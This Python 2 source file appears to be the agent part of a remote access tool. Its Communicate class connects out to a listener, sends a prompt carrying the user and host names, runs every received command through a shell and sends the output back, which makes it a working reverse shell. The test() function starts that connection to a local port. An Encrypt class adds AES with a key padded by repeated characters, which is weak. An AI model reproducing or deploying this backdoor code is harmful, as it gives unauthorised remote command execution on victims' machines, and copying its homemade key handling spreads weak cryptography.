#!/usr/bin/env python
# -*- coding: utf-8 -*-

from Crypto import Random
from Crypto.Cipher import AES
import subprocess
import base64
import hashlib
import socket
import uuid
import pwd
import os
import subprocess

################################################################################
################################################################################
################################################################################

class Encrypt(object):
    """
    Class to encrypt/decrypt data
    """

    @staticmethod
    def pad(**kwargs):
        """
        Pad AES key with chars to match length
        Arguments:
            current_str - String without padding
            current_length - The total length of the padded string
            pad_with - The character to pad the string with
        """
        padded_str = ""
        try:
            current_str = kwargs.get("current_str", "")
            current_length = int(kwargs.get("current_length", 32))
            pad_with = kwargs.get("pad_with", "}")
            padded_str = current_str
            while len(padded_str) < current_length:
                padded_str += str(pad_with)
        except Exception, e_obj:
            print "[!] ERROR - Encrypt.pad() - {0}".format(str(e_obj))
        return padded_str

    @staticmethod
    def encrypt(**kwargs):
        """
        Encrypt plaintext values with pre-shared key
        Arguments:
            plaintext - The plaintext string to be encrypted
            shared_key - The key to encrypt the plaintext with
        """
        encrypted_str = ""
        try:
            plaintext = kwargs.get("plaintext", "")
            shared_key = kwargs.get("shared_key", "")
            iv = Random.new().read(AES.block_size)
            cipher = AES.new(Encrypt.pad(current_str=shared_key), \
                                         AES.MODE_CFB, iv)
            encrypted_str = base64.b64encode(iv + cipher.encrypt(plaintext))
        except Exception, e_obj:
            print "[!] ERROR - Encrypt.encrypt() - {0}".format(str(e_obj))
        return encrypted_str

    @staticmethod
    def decrypt(**kwargs):
        """
        Decrypt ciphertext values with pre-shared key
        Arguments:
            ciphertext - The encrypted string
            shared_key - The shared key to be used to decrypt
        """
        decrypted_str = ""
        try:
            ciphertext = kwargs.get("ciphertext", "")
            shared_key = kwargs.get("shared_key", "")
            ciphertext = base64.b64decode(ciphertext)
            iv = ciphertext[:AES.block_size]
            cipher = AES.new(Encrypt.pad(current_str=shared_key), \
                             AES.MODE_CFB, iv)
            decrypted_str = cipher.decrypt(ciphertext[AES.block_size:])
        except Exception, e_obj:
            print "[!] ERROR - Encrypt.decrypt() - {0}".format(str(e_obj))
        return decrypted_str

    @staticmethod
    def encrypt_multiple(**kwargs):
        """
        Encrypt plaintext values with multiple pre-shared keys
        Arguments:
            plaintext - The plaintext string to be encrypted
            shared_keys - Multiple keys in a list to encrypt a string with
        """
        encrypted_str = ""
        try:
            plaintext = kwargs.get("plaintext", "")
            shared_keys = kwargs.get("shared_keys", [])
            for shared_key in shared_keys:
                if shared_keys.index(shared_key) != 0:
                    plaintext = encrypted_str
                encrypted_str = Encrypt.encrypt(plaintext=plaintext,
                                                shared_key=shared_key)
        except Exception, e_obj:
            print "[!] ERROR - Encrypt.encrypt_multiple() - {0}" \
                  .format(str(e_obj))
        return encrypted_str

    @staticmethod
    def decrypt_multiple(**kwargs):
        """
        Decrypt ciphertext values with multiple pre-shared keys
        Arguments:
            ciphertext - The encrypted string
            shared_keys - The shared key list used to decrypt
        """
        decrypted_str = ""
        try:
            ciphertext = kwargs.get("ciphertext", "")
            shared_keys = kwargs.get("shared_keys", [])
            shared_keys.reverse()
            for shared_key in shared_keys:
                if shared_keys.index(shared_key) != 0:
                    ciphertext = decrypted_str
                decrypted_str = Encrypt.decrypt(ciphertext=ciphertext, \
                                                shared_key=shared_key)
        except Exception, e_obj:
            print "[!] ERROR - Encrypt.decrypt_multiple() - {0}" \
                  .format(str(e_obj))
        return decrypted_str

    @staticmethod
    def sha256(**kwargs):
        """
        Hash text using sha256
        Arguments:
            plaintext - Plaintext string to be hashed
        """
        hashed_str = ""
        try:
            plaintext = kwargs.get("plaintext", "")
            hashed_str = hashlib.sha256(plaintext).hexdigest()
        except Exception, e_obj:
            print "[!] ERROR - Encrypt.sha256() - {0}".format(str(e_obj))
        return hashed_str

################################################################################
################################################################################
################################################################################

class Communicate(object):
    """
    Class for communicating with agents
    """

    def __init__(self, **kwargs):
        """
        Communicate constructor
        Arguments:
            host - The host to communicate with
            port - The port number to communicate on
        """
        self.host = kwargs.get("host", "")
        self.port = int(kwargs.get("port", 0))
        self.sock = socket.socket()
        self.hostname = ""
        self.username = ""
        self.dirname = ""
        try:
            self.hostname = socket.gethostname()
            self.username = pwd.getpwuid(os.getuid()).pw_name
        except Exception, e_obj:
            print "[!] ERROR - Communicate.__init__() - {0}" \
                  .format(str(e_obj))

    def _get_prompt(self):
        """
        Create prompt to send back to the server
        """
        prompt = ""
        try:
            dirpath = os.path.dirname(os.path.realpath(__file__))
            if self.hostname and self.username:
                dirpath = os.path.dirname(os.path.realpath(__file__))
                prompt= "{0}@{1} {2} $ ".format(self.username, self.hostname, \
                                                               dirpath)
            else:
                prompt = "cmd {0} $ ".format(dirpath)
        except Exception, e_obj:
            print "[!] ERROR - Communicate._get_prompt() - {0}" \
                  .format(str(e_obj))
        return prompt

    def _run_command(self, **kwargs):
        """
        Run a command on the host
        Arguments:
            command - The command to execute on the system
        """
        result = ""
        try:
            command = kwargs.get("command", "")
            if command.startswith("cd"):
                cd_cmd = str(command.strip()).split(" ")
                cdir = cd_cmd[1:][0]
                if len(cd_cmd) > 1:
                    os.chdir(str(cdir))
            else:
                proc = subprocess.Popen(command,
                                        shell=True,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        )
                stdout_value, stderr_value = proc.communicate()
                if stdout_value:
                    result = stdout_value
                else:
                    result = stderr_value
        except Exception, e_obj:
            print "[!] ERROR - Communicate._run_command() - {0}" \
                  .format(str(e_obj))
        return result

    def connect_and_communicate(self, **kwargs):
        """
        Connect to a listener and communicate
        Arguments:
            callback - the callback used to process data received
        """
        try:
            callback = kwargs.get("callback", None)
            self.sock.connect((self.host, self.port))
            while True:
                data = ""
                part = None
                self.sock.send(self._get_prompt())
                data = self.sock.recv(4096)
                result = self._run_command(command=data)
                self.sock.send(result)
        except Exception, e_obj:
            print "[!] ERROR - Communicate.connect_and_communicate() - {0}" \
                  .format(str(e_obj))

################################################################################
################################################################################
################################################################################

def test():
    """
    Basic unit testing
    """
    try:
        host = "127.0.0.1"
        port = 8080
        c_obj = Communicate(host=host, port=port)
        c_obj.connect_and_communicate(callback=None)
        # c_obj._run_command(command="cd ..")

        # ### Test #1
        # test_str = "alpha"
        # padded_str = Encrypt.pad(current_str=test_str)
        # result_str = "alpha}}}}}}}}}}}}}}}}}}}}}}}}}}}"
        # assert padded_str == result_str, "Failed test #1"
        #
        # ### Test #2
        # test_str = "alpha"
        # padded_str = Encrypt.pad(current_str=test_str, current_length=16)
        # result_str = "alpha}}}}}}}}}}}"
        # assert padded_str == result_str, "Failed test #2"
        #
        # ### Test #3
        # test_str = "alpha"
        # padded_str = Encrypt.pad(current_str=test_str, pad_with="#")
        # result_str = "alpha###########################"
        # assert padded_str == result_str, "Failed test #3"
        #
        # ### Test #4
        # test_str = "alpha"
        # test_key = "bravo"
        # encrypted_str = Encrypt.encrypt(plaintext=test_str, shared_key=test_key)
        # assert len(encrypted_str) == 28, "Failed test #4"
        #
        # ### Test #5
        # test_str = "alpha"
        # test_key = "bravo"
        # encrypted_str = Encrypt.encrypt(plaintext=test_str, shared_key=test_key)
        # decrypted_str = Encrypt.decrypt(ciphertext=encrypted_str, \
        #                                 shared_key=test_key)
        # assert test_str == decrypted_str, "Failed test #5"
        #
        # ### Test #6
        # test_str = "alpha"
        # test_key_list = ["bravo", "charlie", "delta"]
        # encrypted_str = Encrypt.encrypt_multiple(plaintext=test_str, \
        #                                          shared_keys=test_key_list)
        # assert len(encrypted_str) == 104, "Failed test #6"
        #
        # ### Test #7
        # test_str = "alpha"
        # test_key_list = ["bravo", "charlie", "delta"]
        # encrypted_str = Encrypt.encrypt_multiple(plaintext=test_str, \
        #                                          shared_keys=test_key_list)
        # decrypted_str = Encrypt.decrypt_multiple(ciphertext=encrypted_str, \
        #                                          shared_keys=test_key_list)
        # assert test_str == decrypted_str, "Failed test #7"
        #
        # ### Test #8
        # test_str = "alpha"
        # encrypted_str = Encrypt.sha256(plaintext=test_str)
        # assert len(encrypted_str) == 64, "Failed test #8"
        #
        # print "[*] Unit testing complete"
    except Exception, e_obj:
        print "[!] UNIT TEST ERROR - {0}".format(str(e_obj))

def main():
    """
    The main entrance for application
    """
    print "[*] Done!"

################################################################################
################################################################################
################################################################################

if __name__ == "__main__":

    test()
    main()
